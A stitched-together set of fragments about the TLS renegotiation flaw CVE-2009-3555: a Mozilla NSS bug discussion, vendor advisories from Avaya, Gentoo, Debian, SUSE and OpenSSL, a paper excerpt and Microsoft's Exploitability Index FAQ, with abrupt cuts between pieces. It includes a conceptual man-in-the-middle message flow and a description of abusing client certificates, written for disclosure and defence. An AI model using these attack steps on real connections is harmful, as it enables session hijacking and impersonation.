is no longer vulnerable, and provide ways (through API and also environment variables) for the application or its user to alter that behavior.
Above, I'm merely trying to make sure that two of the products that use NSS
are aware of this and are making appropriate plans to deal with it. It
appears that one of them is, but it does not appear that the other one is.
There's been no response from mozilla.{org,com}.
Feel free to discuss this in dev-tech-crypto all you want, of course!
I'll be happy to join you there. But that is not a place where people from
mozilla.com historically participate, so I don't think that moving the
discussion there is likely to increase the probability of their participation.

I'm a bit worried about changes to the client side. StartCom for example is using client certificate authentication extensively with a big number of users. Since this affects mostly the server side, I'm not sure how clients should/could be protected and from what exactly? Perhaps Jean-Marc has different concerns, not sure...I'm glad to provide more information if this would be of any help.

When I filed this bug, there was a single definite plan (as embodied in the
Internet Draft, [attachment 410650](/attachment.cgi?id=410650 "Internet Draft with Proposed solution for TLS (public version)") [[details]](/attachment.cgi?id=410650&action=edit "Internet Draft with Proposed solution for TLS (public version)") above). The plan for NSS
was simple: Implement the provisions of that ID.
Now, there are at least two competing plans in the TLS working group.
One is a successor Internet Draft to the one I previously attached.
(I will attach it shortly). The other has not yet become a draft, but will
I think, and has a very vocal group of proponents (although others regard it
as a set of "ugly gross hacks").
One way or another, the TLS WG will eventually settle on a new standard and
then NSS will implement it. As a result of all the debate, I now think it is likely tht the standard will define two modes of operation for clients and
two for servers, to be known as "strict" and "lenient". NSS will probably
provide API that matches those modes very closely. That probably means
separate socket option settings for clients and servers.
Incidentally, a BIG issue in all this is how important it will be, going
forward, for browsers to continue to support old servers that are not,
and never were compliant with either the SSL 3.0 or TLS specifications.
Those are the servers for which Firefox implements the "TLS intolerant
server fallback" feature. Some people are using the ongoing existence of
that feature as evidence that browsers will always insist on supporting
old broken servers forever, even if it means remaining vulnerable.
Microsoft and Opera are well represented in this discussion. Mozilla is
noticeably absent.

Hm - NSS is Mozilla, unless I'm misunderstanding things? There are mozilla tinderboxes building off mozilla source repositories that hold fixes from mozilla bugs tracked in mozilla modules and discussions in mozilla newsgroups about how NSS integrates with other mozilla projects like Firefox and Thunderbird.
Do you mean that Firefox as a browser is absent? Do you feel like the Firefox team is likely to take starkly different stances on the eventual resolution of these questions than the NSS team? I haven't personally chimed in here very much because it's not clear to me what that would add in the current state. You guys think much more deeply about TLS renegotiation than I do; I feel like it would be patronizing for the NSS team and their work for me (for instance) to come in and presume to have trenchant insights or give direction on the problem.
I care that users of client software - Firefox in particular but any client-side NSS consumer, really - have a balance between security and usability. I don't want them to have to make technical choices they are unlikely to be equipped to make, and I do want them to be able to use the sites they are accustomed to using, unless we simply cannot stomach the risk that that would represent.
But these are guiding principles, not specific answers to questions about TLS renegotiation. As the Mozilla project most closely tied to the future of TLS, I trust and expect the NSS team to be advocates for Mozilla principles. I know that you have been concerned for some time that the Mozilla corporation doesn't employ people to work directly on NSS, but I think you'd agree that having random MoCo employees on these calls would not help things particularly beyond the expertise the NSS team already brings. I'm certain, for instance, that my presence wouldn't.
Have I misunderstood your concern, here? I know that your intent with your comment wasn't to tuck that in as a passive aggressive slight against MoCo, but I'm not sure what resources you think the Mozilla project should be bringing to bear, beyond your own expertise as an NSS module owner?

The NSS team is unable to accurately represent the Firefox team's preference for security vs. incompatibility. Of course we will do the secure thing with patched servers, but what will we do when we encounter an unpatched (but not necessarily vulnerable) server? We could reject connections entirely (unlikely, at least for a long while), we could connect but without showing a secure state (kind of like "mixed" mode), or we could go ahead and connect and hope the server has either turned off renegotiation or doesn't have any user data worth attacking (wishful thinking).
If we're going to stop connecting to certain old servers is that likely to be over a long phase out, or a more immediate knee-capping? Does NSS need to support prefs that let the browser and/or the browser's user choose the behavior?
I think that's the kind of Feedback Nelson is wanting from "Mozilla" (which, like you I thought included NSS).

In reply to Johnathan's [comment 71](/show_bug.cgi?id=526689#c71 "RESOLVED FIXED - SSL3 & TLS Renegotiation Vulnerability"):
> Do you mean that Firefox as a browser is absent?
Yes, I did. Sorry for not being clear about that. People's perceptions of browsers future responses to this vulnerability are very much driving the actions of the TLS WG at this time. Several people (not me) are claiming
they know what browsers will do when faced with the dilemmas I've described
above. I think the browsers (especially Firefox) should speak for themselves.
> Do you feel like the Firefox team is likely to take starkly different
> stances on the eventual resolution of these questions than the NSS team?
Quite possibly, and more than a little likely, yes. Or perhaps just at vastly different times. Perhaps the browser team will decide that it's time to cut
off vulnerable standards non-compliant servers about 10 years later than the
NSS team would have (as with bad cert overrides).
The motivations and goals for the browser team are quite different than the motivations and goals for the NSS team. More generally, the motivations and goals of browser developers are different than those of SSL/TLS developers.
On numerous occasions, we've seen those two sets of motivations be almost diametrically opposed.
SSL/TLS developers understand that, over time, there will always be a steady
evolution of ciphers, cipher suites, and protocol versions, as older ciphers
and hashes are found to be too weak, and flaws in older protocol versions
are found, and so the SSL/TLS designers want SSL/TLS to be able to easily
evolve and move forward as necessary. They don't inherently value keeping
the old ciphers, suites, and versions alive forever and ever, especially
after they've become perceived as vulnerable, even if it means having to cut
off interoperability with peers (clients, servers) that continue to support
only the old flawed ciphers, suites and versions. TLS developers are ready
to move forward and cut off interoperability with old vulnerable products
as soon as possible, with all due haste. The motivation for SSL/TLS
developers is SECURITY, SECURITY, SECURITY.
Browsers, on the other hand, are all about maximal interoperability. If the
competition works with some site, however flawed, and your browser doesn't,
then your browser is disadvantaged. That's a powerful incentive to browser
developers to keep their products interoperating with old servers, even ones
that are vulnerable. I anticipate that, for a long time to come, we'll be
hearing rationalizations for delaying the day when browsers stop
interoperating with old vulnerable servers (and hence remain vulnerable
themselves).
Today, the companies that STILL sell (in 2009) old SSL 3.0-only servers
that still don't ignore hello extensions, and still don't negotiate SSL 3.0
when offered TLS (in other words, that still absolutely require Firefox's
TLS intolerant server fallback to remain viable on the internet) are using
the fact that Firefox has kept that fallback feature alive for 11 years as
an argument against forward evolution of TLS. Essentially, they're arguing
that, by virtue of keeping fallback alive for 11 years, the browsers are
demonstrating that keeping interoperability alive with those broken old
servers is AND WILL ALWAYS BE valuable, and hence it must be preserved in
perpetuity. So they now argue that TLS can only evolve if it does so in
ways that do not require any changes on the part of those old servers.
The browsers could collectively kill that nonsense with one statement.
If the browsers got together and agreed to collectively kill SSL fallback
on some date, say March 31, 2010, that would right a lot of wrongs, and put
things back on course. It would silence all those who would freeze SSL/TLS
forever as it was 11 years ago. This vulnerability provides a perfect time
to do that, to tell the world that it cannot sit on broken old servers
forever. But if the browsers don't do it, then the purveyors of those
servers will win.
I wish I could say, with confidence, that Firefox would be willing to drop
that fallback stuff on some date (TBD) soon, but today, I cannot. For all
I know. FF really does want to keep it for another 10 years.

We released NSS 3.12.5 with renegotiation disabled by default.
This makes servers invulnerable, but not clients.
This is as much as we can do until the IETF TLS working group standardizes
modifications to TLS, which they are slowly doing. I will file a separate
bug to track that work, and declare this vulnerability fixed.Status: NEW → RESOLVEDClosed: 15 years agoResolution: --- → FIXED

Nelson, I think your last comment needs some rewording to be more clear.
If I'm correct, you mean renegotiation is disabled by default for both server \*and\* clients using NSS 3.12.5 (you can enable it back with the right option flags when setting up the connection).
But that due to the nature of the vulnerability, even when using NSS 3.12.5 with renegotiation disabled, clients can still find themselves interacting with a vulnerable server without any way of knowing it, and this will have the result that the requests they send can be abused.
I think the consequence is that clients using NSS 3.12.5 will probably prefer to programmatically reenable renegotiation when opening a SSL connection, as not doing that will not protect them more (it's when they \*don't\* see a renegotiation happening that they are being abused), and will make them incompatible with non updated servers.
There might be viable strategy of having a warning when a server request of renegotiation and trying to collect the URL of such servers in order to evangelize them into fixing their vulnerability, but this bug is not the right place for discussing such ideas.

Jean-Marc,
I agree with the first two paragraphs of your [comment 75](/show_bug.cgi?id=526689#c75 "RESOLVED FIXED - SSL3 & TLS Renegotiation Vulnerability").
There is also a renegotiation attack on clients that is the mirror image
of the one most common described. Instead of one server seeing streams from
two clients being "spliced" through renegotiation, in the mirror image,
one client sees streams from two servers being spliced through renegotiation.
Disabling renegotiation in clients does render clients invulnerable to those
attacks, but not servers. It's the exact mirror image, and the efficacy of
the single-sided solution is also the mirror image. It protects the side
that would otherwise be fooled by the sliced stream, but not the peers.
So, I think it clients should not assume it is safe to reenable renegotiation
with 3.12.5.

My name is Mikhail Davidov and I am a security consultant for Leviathan Security Group. I have been doing extensive research on this vulnerability since early August and from reading of this thread and the attached patches I fear you have missed the point.
In the case of client-initiated renegotiation, the browser never sees the renegotiation at all. The man-in-the-middle is the 'client' and performs the renegotiation with the SERVER and not the browser. As far as the browser is concerned (at the TCP level) the connection is simply taking a long time to open for an SSL handshake to come through. There is nothing that a browser can do to prevent this so disabling client-initiated renegotiation provides no additional level of security.
Here is the simplified flow of the client-initiated renegotiation bug:
Client Evil Server
================================================
<<<<<LETS\_START\_SSL<<<<<
>>>>>SSLHANDSHAKE>>>>>>>
<<<<<FINISHHANDSHAKE<<<<
>>>>>>EVIL\_HTTP\_REQ>>>>>
>>>>RENEGOTIATE\_REQ>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<LETS\_START\_SSL<<<<<
>>>>SSLHANDSHAKE>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<<<FINISHHANDSHAKE<<<<
>>>>LEGITIMATE\_HTTP\_REQ>>>>>>>>>>>>>>>>>>>>>>>
<<<<<<<<<<<<<<<<<<<<<<<<<RESPONSE\_TO\_EVIL<<<<<
In conclusion the browser never sees nor does it ever initiate a renegotiation.
I will be pushing out a whitepaper on this subject very shortly which will cover this more in depth but in the mean time feel free to contact me for further clarification.

Mikhail,
Your [comment 77](/show_bug.cgi?id=526689#c77 "RESOLVED FIXED - SSL3 & TLS Renegotiation Vulnerability") wasn't addressed to anyone in particular, but no-one on the
NSS team has missed the point here. We're quite aware that the client
doesn't see the attack, when the attack is done against the server, and
conversely, the server doesn't see the attack when it is done against the
client.
As you know, until such time as clients and servers have been upgraded to
know how to avoid this vulnerability, and to signal that they have been
upgraded, the best we can do is to avoid consciously participating in
vulnerable renegotiations. That's what the patch for this bug did.
The upgraded behavior is the subject of [bug 537356](/show_bug.cgi?id=537356 "RESOLVED FIXED - Implement new safe SSL3 & TLS renegotiation").

nss security update (RHSA-2010-0165)

Original Release Date: May 3, 2010

Last Revised: March 1, 2012

Number: ASA-2010-119

Risk Level: Low

Advisory Version: 6.0

Advisory Status: Final

---

## 1. Overview:

Network Security Services (NSS) is a set of libraries designed to support
the cross-platform development of security-enabled client and server
applications. Applications built with NSS can support SSLv2, SSLv3, TLS,
and other security standards.

Netscape Portable Runtime (NSPR) provides platform independence for non-GUI
operating system facilities. These facilities include threads, thread
synchronization, normal file and network I/O, interval timing, calendar
time, basic memory management (malloc and free), and shared library
linking.

A flaw was found in the way the TLS/SSL (Transport Layer Security/Secure
Sockets Layer) protocols handled session renegotiation. A man-in-the-middle
attacker could use this flaw to prefix arbitrary plain text to a client's
session (for example, an HTTPS connection to a website). This could force
the server to process an attacker's request as if authenticated using the
victim's credentials. This update addresses this flaw by implementing the
TLS Renegotiation Indication Extension, as defined in RFC 5746.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2009-3555](https://www.redhat.com/security/data/cve/CVE-2009-3555.html) to this issue.

Refer to the following Knowledgebase article for additional details about
this flaw: <http://kbase.redhat.com/faq/docs/DOC-20491>

More information about these vulnerabilities can be found in the security advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2010-0165.html>

**Recommended Actions for System Products:**
Avaya strongly recommends that customers follow
networking and security best practices by implementing
firewalls, ACLs, physical security or other appropriate
access restrictions. Though Avaya believes such
restrictions should always be in place; risk to Avaya's
product and the surrounding network from this potential
vulnerability may be mitigated by ensuring these
practices are implemented until such time as a product
update is available or the recommended action is applied.
Further restrictions as deemed necessary based on the
customer's security policies may be required during this
interim period.

## 3. Avaya Software-Only Products:

# nginx: Multiple vulnerabilities — GLSA **201203-22**

Multiple vulnerabilities have been found in nginx, the worst of
which may allow execution of arbitrary code.

### Affected packages

| Package | **www-servers/nginx** on all architectures |
| --- | --- |
| Affected versions | < **1.0.14** |
| Unaffected versions | >= **1.0.14** |

### Background

nginx is a robust, small, and high performance HTTP and reverse proxy
server.

### Description

Multiple vulnerabilities have been found in nginx:

* The TLS protocol does not properly handle session renegotiation
  requests (CVE-2009-3555).
* The "ngx\_http\_process\_request\_headers()" function in ngx\_http\_parse.c
  could cause a NULL pointer dereference (CVE-2009-3896).
* nginx does not properly sanitize user input for the the WebDAV COPY
  or MOVE methods (CVE-2009-3898).
* The "ngx\_resolver\_copy()" function in ngx\_resolver.c contains a
  boundary error which could cause a heap-based buffer overflow
  (CVE-2011-4315).
* nginx does not properly parse HTTP header responses which could
  expose sensitive information (CVE-2012-1180).

### Impact

A remote attacker could possibly execute arbitrary code with the
privileges of the nginx process, cause a Denial of Service condition,
create or overwrite arbitrary files, or obtain sensitive information.

### Workaround

There is no known workaround at this time.

### Resolution

All nginx users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-servers/nginx-1.0.14"

```

Hi thank you for the patch and for identifying the issue as well. I like
both your patch and the fix itself. Would you be interested in signing
the copyright assignment papers for FSF?

best regards,
Nikos

- ------------------------------------------------------------------------

Package        : apache2
Vulnerability  : backward compatibility option for SSL/TLS insecure
                 renegotiation
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2009-3555
Debian Bug     : 587037

DSA-2141-1 changed the behaviour of the openssl libraries in a server
environment to only allow SSL/TLS renegotiation for clients that
support the RFC5746 renegotiation extension. This update to apache2
adds the new SSLInsecureRenegotiation configuration option that allows
to restore support for insecure clients. More information can be found
in the file /usr/share/doc/apache2.2-common/NEWS.Debian.gz .

For the stable distribution (lenny), the compatibility option has been
included in version 2.2.9-10+lenny9.

In addition, apache2-mpm-itk has been rebuilt to work with the updated
apache2 packages. The new version number is 2.2.6-02-1+lenny4.

For the unstable distribution (sid), and the testing distribution
(squeeze), the compatibility option has been included since version
2.2.15-1.

We recommend that you upgrade your apache2 and apache2-mpm-itk
packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <http://www.debian.org/security/>

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.

   OpenSSL version 0.9.8l released
   ===============================

   OpenSSL - The Open Source toolkit for SSL/TLS
   <http://www.openssl.org/>

   The OpenSSL project team is pleased to announce the release of
   version 0.9.8l of our open source toolkit for SSL/TLS. This new
   OpenSSL version is a security release which disables renegotiation
   as a workaround for CVE-2009-3555.  For a complete list of changes,
   please see <http://www.openssl.org/source/exp/CHANGES>.

   We consider OpenSSL 0.9.8l to be the best version of OpenSSL
   available and we strongly recommend that users of older versions
   upgrade as soon as possible. OpenSSL 0.9.8l is available for
   download via HTTP and FTP from the following master locations (you
   can find the various FTP mirrors under
   <http://www.openssl.org/source/mirror.html>):

     * <http://www.openssl.org/source/>
     * ftp://ftp.openssl.org/source/

   The distribution file names are:

    o openssl-0.9.8l.tar.gz
      Size: 4179422
      MD5 checksum: 05a0ece1372392a2cf310ebb96333025
      SHA1 checksum: d3fb6ec89532ab40646b65af179bb1770f7ca28f

   The checksums were calculated using the following commands:

    openssl md5 openssl-0.9.*.tar.gz
    openssl sha1 openssl-0.9.*.tar.gz

   Yours,

   The OpenSSL Project Team...

Yes. I regret that we didn't get a chance to update the paper before
making it generally available, so it is a bit understated:

"Other techniques allow the attacker to forward or re-purpose client
certificate authentication credentials."

It's even worse than that. In practice, clients will sign with their
client cert without user intervention.

"For one thing, browsers' behavior of allowing automatic certificate
sending is suspect and should be reconsidered. Secondly, browsers suffer
from a fundamental inability to authenticate the specific transaction
the server is about to execute, ostensibly on behalf of the client. That
underlying problem should be addressed, and will likely involve either a
protocol change or changes in the way existing protocols are implemented.

"Finally, it may make sense to require clients to authenticate servers
using the supplied certificate before handing client certificates back
to the server. This will effectively prevent the chosen-server attack
scenarios described above. This may also represent a breaking protocol
change, however, and is being investigated.

Even worse (and this is shown in some of the packet captures), web
servers will execute MITM's request as soon as they get the Finished
message from legit client, but the browser doesn't put up the scary page
until he gets the Finished from the server (which could simply be
silently dropped by the MITM).

So if a client has useful client cert (or smart card) credentials, MITM
can redirect a request to a server of his choosing that will accept
them, use them to authenticate his arbitrary transaction, and the
browser may never even show the scary cert error page.

java-1.6.0-openjdk security and bug fix update (RHSA-2010-0768)

Original Release Date: October 29, 2010

Last Revised: August 20, 2013

Number: ASA-2010-308

Risk Level: Medium

Advisory Version: 3.0

Advisory Status: Final

---

## 1. Overview:

These packages provide the OpenJDK 6 Java Runtime Environment and the
OpenJDK 6 Software Development Kit.

defaultReadObject of the Serialization API could be tricked into setting a
volatile field multiple times, which could allow a remote attacker to
execute arbitrary code with the privileges of the user running the applet
or application. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3569](https://www.redhat.com/security/data/cve/CVE-2010-3569.html) to this issue.

Race condition in the way objects were deserialized could allow an
untrusted applet or application to misuse the privileges of the user
running the applet or application. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3568](https://www.redhat.com/security/data/cve/CVE-2010-3568.html) to this issue.

Miscalculation in the OpenType font rendering implementation caused
out-of-bounds memory access, which could allow remote attackers to execute
code with the privileges of the user running the java process.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3567](https://www.redhat.com/security/data/cve/CVE-2010-3567.html) to this issue.

JPEGImageWriter.writeImage in the imageio API improperly checked certain
image metadata, which could allow a remote attacker to execute arbitrary
code in the context of the user running the applet or application.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3565](https://www.redhat.com/security/data/cve/CVE-2010-3565.html) to this issue.

Double free in IndexColorModel could cause an untrusted applet or
application to crash or, possibly, execute arbitrary code with the
privileges of the user running the applet or application. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3562](https://www.redhat.com/security/data/cve/CVE-2010-3562.html) to this issue.

The privileged accept method of the ServerSocket class in the Common Object
Request Broker Architecture (CORBA) implementation in OpenJDK allowed it to
receive connections from any host, instead of just the host of the current
connection. An attacker could use this flaw to bypass restrictions defined
by network permissions. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3561](https://www.redhat.com/security/data/cve/CVE-2010-3561.html) to this issue.

Flaws in the Swing library could allow an untrusted application to modify
the behavior and state of certain JDK classes. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3557](https://www.redhat.com/security/data/cve/CVE-2010-3557.html) to this issue.

Flaws in the CORBA implementation could allow an attacker to execute
arbitrary code by misusing permissions granted to certain system objects.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3554](https://www.redhat.com/security/data/cve/CVE-2010-3554.html) to this issue.

UIDefault.ProxyLazyValue had unsafe reflection usage, allowing untrusted
callers to create objects via ProxyLazyValue values. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3553](https://www.redhat.com/security/data/cve/CVE-2010-3553.html) to this issue.

HttpURLConnection improperly handled the "chunked" transfer encoding
method, which could allow remote attackers to conduct HTTP response
splitting attacks. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3549](https://www.redhat.com/security/data/cve/CVE-2010-3549.html) to this issue.

HttpURLConnection improperly checked whether the calling code was granted
the "allowHttpTrace" permission, allowing untrusted code to create HTTP
TRACE requests. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3574](https://www.redhat.com/security/data/cve/CVE-2010-3574.html) to this issue.

HttpURLConnection did not validate request headers set by applets, which
could allow remote attackers to trigger actions otherwise restricted to
HTTP clients. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the names [CVE-2010-3541](https://www.redhat.com/security/data/cve/CVE-2010-3541.html) and [CVE-2010-3573](https://www.redhat.com/security/data/cve/CVE-2010-3573.html) to these issues.

The Kerberos implementation improperly checked the sanity of AP-REQ
requests, which could cause a denial of service condition in the receiving
Java Virtual Machine. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3564](https://www.redhat.com/security/data/cve/CVE-2010-3564.html) to this issue.

The RHSA-2010:0339 update mitigated a man-in-the-middle attack in the way
the TLS/SSL (Transport Layer Security/Secure Sockets Layer) protocols
handle session renegotiation by disabling renegotiation. This update
implements the TLS Renegotiation Indication Extension as defined in RFC
5746, allowing secure renegotiation between updated clients and servers.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2009-3555](https://www.redhat.com/security/data/cve/CVE-2009-3555.html) to this issue.

The NetworkInterface class improperly checked the network "connect"
permissions for local network addresses, which could allow remote attackers
to read local network addresses. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3551](https://www.redhat.com/security/data/cve/CVE-2010-3551.html) to this issue.

Information leak flaw in the Java Naming and Directory Interface (JNDI)
could allow a remote attacker to access information about
otherwise-protected internal network names. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2010-3548](https://www.redhat.com/security/data/cve/CVE-2010-3548.html) to this issue.

## 2. Avaya System Products with java-1.6.0-openjdk installed:

| Product: | Affected Version(s): | Risk Level: | Actions: |
| --- | --- | --- | --- |
| Avaya Aura™ Conferencing Standard Edition | 6.0 | Medium | See recommended actions and Mitigating Factors table below. This advisory will not be addressed as no further releases are planned. It is recommended that customers migrate to one of Avaya's conferencing solutions including Aura® Conferencing 7.0 or later. |
| Avaya Aura™ System Platform | 1.1, 6.0 thru 6.0.3.5.3 | Low | Upgrade to SP6.0 Patch 6.0.3.6.3 or later. Rated a Low Risk since the jdk in Domain-0 is not a daemon and is used in a very limited fashion for a single application that is not accessible through the network interface. |

**Recommended Actions for System Products:**
Avaya strongly recommends that customers follow
networking and security best practices by implementing
firewalls, ACLs, physical security or other appropriate
access restrictions. Though Avaya believes such
restrictions should always be in place; risk to Avaya's
product and the surrounding network from this potential
vulnerability may be mitigated by ensuring these
practices are implemented until such time as a product
update is available or the recommended action is applied.
Further restrictions as deemed necessary based on the
customer's security policies may be required during this
interim period.

# Microsoft Exploitability Index

The Microsoft Exploitability Index helps customers prioritize security update deployment by providing information on the likelihood that a vulnerability addressed in a Microsoft security update will be exploited.

## The Microsoft Exploitability Index

The Exploitability Index may help customers evaluate risk for a vulnerability. Microsoft evaluates the potential exploitability of each vulnerability associated with a Microsoft security update and then publishes the exploitability information as part of the monthly Microsoft security update details. If after publishing the details Microsoft determines that the Exploitability Index Assessment warrants a change, it will change the assessment and notify customers through technical security notifications. The company will not update the assessment when exploit code is posted that matches the existing exploitability information.

The Exploitability Index uses one of four values to communicate to customers the likelihood of a vulnerability being exploited, based on the vulnerabilities addressed by the Microsoft security update.

| Exploitability index assessment | Short definition |
| --- | --- |
| 0 | Exploitation detected |
| 1 | Exploitation more likely \* |
| 2 | Exploitation less likely \*\* |
| 3 | Exploitation unlikely \*\*\* |

### 0 – Exploitation Detected

Microsoft is aware of an instance of this vulnerability being exploited. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with the highest priority.

### 1 – Exploitation More Likely

Microsoft analysis has shown that exploit code could be created in such a way that an attacker could consistently exploit this vulnerability. Moreover, Microsoft is aware of past instances of this type of vulnerability being exploited. This would make it an attractive target for attackers, and therefore more likely that exploits could be created. As such, customers who have reviewed the security update and determined its applicability within their environment should treat this with a higher priority.

### 2 – Exploitation Less Likely

Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.

### 3 – Exploitation Unlikely

Microsoft analysis shows that successfully functioning exploit code is unlikely to be utilized in real attacks. This means that while it might be possible for exploit code to be released that could trigger the vulnerability and cause abnormal behavior, the full impact of exploitation will be more limited. Moreover, Microsoft has not observed instances of this type of vulnerability being actively exploited in the past. Thus, the actual risk of being exploited from this vulnerability is significantly lower. Therefore, customers who have reviewed the security update to determine its applicability within their environment could prioritize this update below other vulnerabilities within a release.

In those scenarios where multiple product series are affected, for instance a vulnerability that affects both Windows and Office, the rating reflects the highest risk level across both products. Likewise, the rating reflects the highest risk present across all versions of the product.  In this case, if the Exploitability Assessment on the latest version of Office is "1," and on the latest version of Windows is "2," the rating will reflect "1."  If the XI rating for Windows 10 version 2004 is “2” and the rating for Windows 7 is “1”, the rating will reflect “1”.

## Important Terms and Definitions

**Exploit Code** – A software program or sample code that, when executed against a vulnerable system, uses the vulnerability to spoof attacker identity, tamper with user or system information, repudiate attacker action, disclose user or system information on the server side, deny service to valid users, or elevate privileges for the attacker. For example, if a vulnerability had a security impact of remote code execution, Exploit Code could cause remote code execution to occur when run against a target system.

**Trigger a Vulnerability** – The ability to reach the vulnerable code, but not always achieving the maximum impact. For example, it may be easy to trigger a remote code execution vulnerability, but the resulting effect may only be a denial of service.

* ### What is the Microsoft Exploitability Index?

  The Microsoft Exploitability Index provides additional information to help customers prioritize their deployment of the monthly security updates. Microsoft designed this index to provide customers guidance concerning the likelihood of exploitation, based on each vulnerability addressed by Microsoft security updates.
* ### Why did Microsoft create the Exploitability Index?

  Customers asked for more information to help them prioritize their deployment of Microsoft security updates each month, specifically requesting details about the likelihood of exploitation for the vulnerabilities addressed in security updates. The Exploitability Index provides guidance about the actual risk of exploitation of a vulnerability at the time of the security update’s release.
* ### How are vulnerabilities rated?

  Microsoft Exploitability Index focuses on two aspects of a vulnerability to build its ratings:
  1. Current exploitation trends, based on telemetry data and awareness of exploitation of a particular type of vulnerability in a particular product,
  2. The cost and reliability of building a working exploit for the vulnerability, based on a technical analysis of the vulnerability.
* ### Is this a truly reliable rating system?

  While reliably predicting activity within the security ecosystem is always difficult, there are three reasons why this system should be useful. First, over the last few years we have realized that many security researchers analyze the updates associated with Microsoft's security updates the day they are released to create and evaluate protections. In doing so, many of these researchers also create exploit code to test them. The methodology used to develop this exploit code is like the one Microsoft uses to determine the likelihood of exploit code release. Microsoft analyzes the updates themselves, the nature of the vulnerability, and the conditions that must be met for an exploit to execute successfully. Second, not all vulnerabilities resolved by our security updates are exploited. A vulnerability may well be technically exploitable with a high degree of reliability, but it may never be exploited. We continuously monitor and track exploitation activity to keep up to date with current trends. This in turn informs our opinion of what constitutes a more attractive vulnerability over similar vulnerabilities, and enables us to more accurately communicate an actual risk, rather than a potential one from the vulnerabilities we patch.
  Finally, we are also partnering with protection providers through the Microsoft Active Protections Program (MAPP), working with them to help validate our predictions each month – thereby using a community approach to ensure better accuracy through information sharing.
* ### How is the Exploitability Index different from the Security Update Severity Rating system?

  The Security Update Severity Rating System assumes that exploitation will be successful. For some vulnerabilities where exploitability is high, this assumption is very likely to be true for a broad set of attackers. For other vulnerabilities where exploitability is low, this assumption may only be true when a dedicated attacker puts a lot of resources into ensuring their attack is successful. Regardless of the Severity or Exploitability Index rating, Microsoft always recommends that customers deploy all applicable and available updates; however, this rating information can assist sophisticated customers in prioritizing their approach to each month's release.
* ### How are Denial of Service, Tampering, Information Disclosure, or Spoofing issues rated?

  The Exploitability Index does not differentiate between vulnerability types. It focuses on the likelihood of exploitation of each vulnerability within the range of their full impact potential. Thus, any vulnerability, whether it is Remote Code Execution, Tampering or other, could be rated any of the Exploitability Index ratings.
* ### What happens when newly emerging information requires an update to the Exploitability Index rating?

